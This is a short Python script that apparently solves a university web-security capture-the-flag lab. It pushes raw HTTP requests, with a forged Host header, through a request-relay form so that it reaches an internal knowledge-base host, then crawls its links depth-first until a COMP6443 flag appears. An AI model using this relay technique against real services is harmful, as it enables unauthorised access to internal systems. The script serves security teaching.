import requests
import re

session = requests.Session()
session.cert = "../../z5437741.pem"

URL = "https://haas-v3.quoccacorp.com"

def append_carriage_return(request: str) -> str:
    return '\n'.join(line + '\r' for line in request.split('\n'))

def create_request(path: str) -> str:
    request = """GET {path} HTTP/1.1
Host: kb.quoccacorp.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://haas.quoccacorp.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://haas.quoccacorp.com
Connection: keep-alive

"""
    return append_carriage_return(request.format(path=path))

PATH_PATTERN = r'<a href="([^"]+)">'
FLAG_PATTERN = r"(COMP6443{.+?})"

def find_flag_dfs(path: str, visited: set):
    if path in visited:
        return

    visited.add(path)
    request = create_request(path)
    response = session.post(URL, data={"requestBox": request})
    response_text = response.content.decode()
    print(response_text)

    flag_match = re.search(FLAG_PATTERN, response_text)
    if flag_match:
        print("\n===== FLAG FOUND =====\n" * 10)
        return

    matches = re.findall(PATH_PATTERN, response_text)

    for match in matches:
        find_flag_dfs(match, visited)

find_flag_dfs("/", set())